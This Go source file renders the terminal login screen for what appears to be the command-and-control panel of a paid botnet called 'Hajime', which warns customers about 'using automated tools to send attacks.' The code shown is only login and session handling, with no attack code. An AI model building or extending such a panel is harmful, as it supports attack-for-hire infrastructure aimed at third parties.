package views

import (
	"hajime/modules/goterm2lite"
	"hajime/source/db"
	"hajime/source/masters/sessions"
	"hajime/source/masters/terminal"
	"strings"
	"time"
)

// loginPage renders the page and authenticates the user
func LoginPage(terminal *terminal.Terminal) error {
	if _, err := terminal.Clear(); err != nil {
		return err
	}

	term, user := goterm2lite.New(terminal, 80, 23), make(chan *db.User)

	/* implements a border box around the display */
	term.NewText(0, 0, "\x1b[38;5;15m┌"+strings.Repeat("─", term.X-2)+"┐\x1b[0m")
	for i := 1; i < term.Y; i++ {
		term.NewText(0, i, "\x1b[38;5;15m│\x1b[0m"+strings.Repeat(" ", term.X-2)+"\x1b[38;5;15m│\x1b[0m")
	}

	/* writes all the text sprites to the terminal */
	term.NewText(0, term.Y, "\x1b[38;5;15m└"+strings.Repeat("─", term.X-2)+"┘\x1b[0m")
	term.NewText(31, 6, "\x1b[38;5;105mHajime\x1b[38;5;15m | botnet\x1b[38;5;105m.\x1b[0m")
	term.NewText(22, 18, "\x1b[38;5;9mUsing automated tools is \x1b[38;5;15mprohibited.\x1b[0m")
	term.NewText(15, 19, "\x1b[38;5;9mIf you are caught using automated tools to send attacks\x1b[0m")
	term.NewText(18, 20, "\x1b[38;5;9myour account will be terminated without a \x1b[38;5;15mrefund.\x1b[0m")
	term.NewText(2, 22, "\x1b[38;5;15mIf your client doesn't support \x1b[38;5;105mmouse clicks\x1b[38;5;15m, press \x1b[38;5;105mtab\x1b[38;5;15m.")

	/* defines the login button and the username and password inputs */
	username := term.NewInput(24, 26, 8, 9, 26, "", "\x1b[38;5;15m┌ Username ───────────────────┐\x1b[0m", "\x1b[38;5;15m│\x1b[38;5;245m                             \x1b[38;5;15m│\x1b[0m", "\x1b[38;5;15m└─────────────────────────────┘\x1b[0m")
	password := term.NewInput(24, 26, 11, 12, 26, "*", "\x1b[38;5;15m┌ Password ───────────────────┐\x1b[0m", "\x1b[38;5;15m│\x1b[38;5;105m                             \x1b[38;5;15m│\x1b[0m", "\x1b[38;5;15m└─────────────────────────────┘\x1b[0m")

	/* defines the button to login */
	login := term.NewButton(24, 15, "\x1b[38;5;105m┌─────────────────────────────┐\x1b[0m", "\x1b[38;5;105m│\x1b[38;5;15m            Login            \x1b[38;5;105m│\x1b[0m", "\x1b[38;5;105m└─────────────────────────────┘\x1b[0m")
	login.OnClick(func() bool {
		account, err := db.Conn.GetUser(username.Value())
		if err != nil || !account.IsPassword([]byte(password.Value())) {
			return false
		}

		/* inside a sender thread, we forward the account property */
		go func() {
			user <- account
		}()

		return true
	})

	password.OnSubmit(login)
	if err := term.Run(); err != nil {
		return err
	}

	select {

	/* whenever a login happens */
	case account := <-user:
		session := sessions.New(terminal, account)
		if err := session.Add(); err != nil {
			return err
		}

		defer session.Remove()
		return PromptPage(session)

	/* timeouts from the receiver */
	case <-time.After(50 * time.Millisecond):
		return terminal.Close()
	}
}
